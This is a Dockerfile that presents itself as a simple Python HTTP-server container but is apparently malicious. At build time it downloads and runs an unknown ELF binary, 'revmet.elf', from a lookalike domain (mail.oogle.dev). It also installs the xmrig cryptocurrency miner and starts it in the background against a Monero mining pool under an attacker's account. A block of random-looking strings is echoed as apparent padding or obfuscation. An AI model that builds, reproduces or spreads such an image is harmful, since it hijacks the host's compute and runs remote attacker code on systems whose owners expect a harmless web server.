FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo HCgYsn4rtFP9lIKveCjCkBxfnYzAvzDH DWvN2q5dcphHW4iKvG5lqTwE02EoviJI 07b1gcHaMM8ION5YAhaAhaTX6eqtYWGU AVyVW63ikD8QrwSB2az6LfW88Oi5IytJ dcmxPKK44aBuPt3TeIKcIrKeRYoKXqSd ovcL9GCURblQXOsTidgNrv2Eb0wWZ0Fc h2c3vuprXPdsfzv0SK4ZaLadI2ENtAlK Nvdys0t7vLpDXIVHyfA18Ty7Is2DJeko cEmvyy2AiPJLxrpPjF3cqfp4zBh1xQOn 31SouK1ifsgetgRwMYv0zjEOSWRcMX3R ack2YUgXr0Hs3tgTSeIc4XZtuQm783em vj3T8T0FzEXyNhIGMAQPfhSdxVMUiFn9 WTulPWUYRQZ8hGElIgE9SOS2xsS5c1YK ACZLladRCV8m96H5pzuRvSRo079quIwN 4Oxlwe3vMfAgeWRm2MIcu0Qu3z185tUj DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]